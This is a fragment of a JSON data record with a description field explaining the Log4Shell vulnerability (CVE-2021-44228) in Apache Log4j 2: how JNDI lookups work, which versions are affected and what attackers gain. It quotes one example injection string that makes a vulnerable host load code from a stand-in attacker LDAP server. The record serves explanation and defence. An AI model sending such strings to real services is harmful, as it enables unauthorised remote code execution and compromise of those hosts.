    "desc": "CVE\u20112021\u201144228, commonly called Log4Shell, is a critical vulnerability in the Apache Log4j\u202f2 Java logging library. The flaw resides in Log4j\u2019s message lookup mechanism which processes `${jndi:\u2026}` patterns. When an attacker can influence data that is logged \u2013 for example HTTP headers, URL parameters, or form fields \u2013 and that data contains a malicious `${jndi:ldap://attacker.com/a}` string, Log4j performs a Java Naming and Directory Interface (JNDI) lookup. The JNDI lookup can resolve to an LDAP or RMI server under the attacker\u2019s control, causing the vulnerable host to download and instantiate arbitrary Java classes. The downloaded code is executed with the privileges of the Java process, giving the attacker full remote code execution on the affected system. The vulnerability is present in all Log4j\u202f2 core versions from 2.0\u2011beta9 up to and including 2.15.0. Exploitation requires no authentication, no prior access, and can be carried out over the network simply by sending a crafted request to any service that logs attacker\u2011supplied data. Successful exploitation allows the attacker to install back\u2011doors, steal credentials, run ransomware, deploy cryptominers, or otherwise compromise the confidentiality, integrity, and availability of the host.",
